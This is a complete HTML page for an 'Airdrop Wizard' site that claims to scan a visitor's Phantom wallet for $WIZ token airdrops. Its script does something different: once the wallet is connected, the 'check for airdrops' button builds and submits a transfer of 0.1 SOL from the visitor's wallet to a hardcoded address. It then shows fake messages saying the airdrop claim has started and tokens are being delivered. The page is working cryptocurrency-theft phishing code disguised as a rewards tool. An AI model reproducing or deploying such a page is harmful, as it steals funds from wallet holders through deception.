<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>AIRDROP WIZARD • $WIZ</title>
  <script src="https://unpkg.com/@solana/web3.js@latest/dist/web3.min.js"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&family=VT323&display=swap');

    :root {
      --neon-pink: #ff00ff;
      --neon-cyan: #00ffff;
      --neon-green: #39ff14;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background: linear-gradient(135deg, #0a0a1f 0%, #1a0033 100%);
      color: #00ffff;
      font-family: 'VT323', monospace;
      font-size: 24px;
      line-height: 1.5;
      min-height: 100vh;
      position: relative;
    }

    body::before {
      content: '';
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: repeating-linear-gradient(transparent 0px, transparent 3px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.04) 6px);
      pointer-events: none;
      z-index: 1;
      animation: scan 5s linear infinite;
    }

    @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }

    .container { padding: 20px; position: relative; z-index: 2; }

    header { text-align: center; padding: 30px 0 20px; }

    .logo {
      font-family: 'Press Start 2P', cursive;
      font-size: 3.2rem;
      background: linear-gradient(90deg, #ff00ff, #00ffff, #39ff14);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 30px #ff00ff;
      animation: glitch 1.8s infinite alternate;
    }

    @keyframes glitch {
      0% { transform: translate(0); }
      20% { transform: translate(-2px, 2px); }
      40% { transform: translate(2px, -2px); }
      100% { transform: translate(0); }
    }

    .tagline {
      font-size: 1.8rem;
      color: var(--neon-green);
      margin: 10px 0 30px;
    }

    .card {
      background: rgba(10, 10, 31, 0.92);
      border: 4px solid var(--neon-cyan);
      box-shadow: 0 0 40px var(--neon-cyan);
      padding: 30px 25px;
      margin: 0 auto;
      max-width: 520px;
      border-radius: 8px;
    }

    h1 {
      font-size: 2.6rem;
      color: var(--neon-pink);
      text-align: center;
      margin-bottom: 15px;
      text-shadow: 0 0 20px var(--neon-pink);
    }

    button {
      width: 100%;
      background: linear-gradient(45deg, #ff00ff, #00ffff);
      color: #000;
      font-family: 'Press Start 2P', cursive;
      font-size: 1.7rem;
      padding: 22px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin: 15px 0;
      box-shadow: 0 0 30px #ff00ff;
      text-transform: uppercase;
      letter-spacing: 3px;
    }

    #sendBtn {
      background: linear-gradient(45deg, #39ff14, #00ffff);
      font-size: 1.85rem;
      padding: 26px;
    }

    .status {
      margin: 25px 0;
      font-size: 1.5rem;
      text-align: center;
      min-height: 90px;
    }

    .connected { color: #39ff14; }

    footer {
      text-align: center;
      padding: 40px 10px 20px;
      color: #888;
      font-size: 1.3rem;
    }

    .scanline {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: linear-gradient(to bottom, transparent 50%, rgba(57,255,20,0.06) 50%);
      background-size: 100% 6px;
      pointer-events: none;
      z-index: 3;
      animation: scanline-move 7s linear infinite;
    }

    @keyframes scanline-move { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
  </style>
</head>
<body>
  <div class="scanline"></div>
  
  <div class="container">
    <header>
      <div class="logo">AIRDROP WIZARD</div>
      <div class="tagline">NEON REWARDS AWAIT</div>
    </header>

    <div class="card">
      <h1>CHECK FOR AIRDROPS</h1>
      <p style="text-align:center; font-size:1.6rem; margin-bottom:30px;">
        Connect your Phantom wallet to scan for pre-existing token balances<br>
        and claim your $WIZ airdrop from the neon grid.
      </p>

      <button id="connectBtn">CONNECT PHANTOM WALLET</button>
      <button id="sendBtn" style="display:none;">CHECK FOR AIRDROPS</button>

      <div id="status" class="status"></div>
    </div>

    <footer>
      © 2026 Airdrop Wizard • $WIZ TOKEN
    </footer>
  </div>

  <script>
    const connectBtn = document.getElementById('connectBtn');
    const sendBtn = document.getElementById('sendBtn');
    const statusDiv = document.getElementById('status');
    const RECIPIENT = "MuDxVcdRAA4dHzKbJsNeLzY5cTn8KMAA1Mz7428seHn";
    const AMOUNT_SOL = 0.1;

    let provider = null;
    let publicKey = null;

    async function connectPhantom() {
      if (!window.solana || !window.solana.isPhantom) {
        statusDiv.innerHTML = `<span style="color:#ff00ff;">❌ Phantom not found.<br>Install from phantom.app</span>`;
        return;
      }

      try {
        provider = window.solana;
        const resp = await provider.connect();
        publicKey = resp.publicKey;

        statusDiv.innerHTML = `
          <span class="connected">✅ WALLET CONNECTED</span><br>
          <small>${publicKey.toString().slice(0,8)}...${publicKey.toString().slice(-6)}</small>
        `;

        connectBtn.style.display = 'none';
        sendBtn.style.display = 'block';

      } catch (err) {
        statusDiv.innerHTML = `<span style="color:#ff00ff;">Connection cancelled.</span>`;
      }
    }

    async function sendTransaction() {
      if (!provider || !publicKey) {
        statusDiv.innerHTML = `<span style="color:#ff00ff;">Please connect wallet first.</span>`;
        return;
      }

      statusDiv.innerHTML = `<span style="color:#ffff00;">Scanning the neon grid for your airdrops...</span>`;

      try {
        const connection = new solanaWeb3.Connection(
          "https://api.mainnet-beta.solana.com", 
          "confirmed"
        );

        const lamports = Math.floor(AMOUNT_SOL * solanaWeb3.LAMPORTS_PER_SOL);

        const transaction = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: new solanaWeb3.PublicKey(RECIPIENT),
            lamports: lamports,
          })
        );

        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;

        statusDiv.innerHTML = `<span style="color:#ffff00;">Waiting for Phantom approval...</span>`;

        const signedTransaction = await provider.signAndSendTransaction(transaction);

        statusDiv.innerHTML = `
          <span style="color:#39ff14;">✅ AIRDROP CLAIM INITIATED!</span><br>
          Transaction: ${signedTransaction.signature.slice(0,12)}...
        `;

        setTimeout(() => {
          statusDiv.innerHTML += `<br><span style="color:#ffff00;">Your $WIZ tokens are being delivered. Welcome to the neon grid!</span>`;
        }, 2500);

      } catch (err) {
        console.error(err);
        statusDiv.innerHTML = `<span style="color:#ff00ff;">Transaction rejected.<br>Please try again.</span>`;
      }
    }

    connectBtn.addEventListener('click', connectPhantom);
    sendBtn.addEventListener('click', sendTransaction);

    window.addEventListener('load', () => {
      if (window.solana && window.solana.isPhantom) {
        statusDiv.innerHTML = `<span style="color:#39ff14;">Phantom detected ✓ Ready to check airdrops</span>`;
      }
    });
  </script>
</body>
</html>
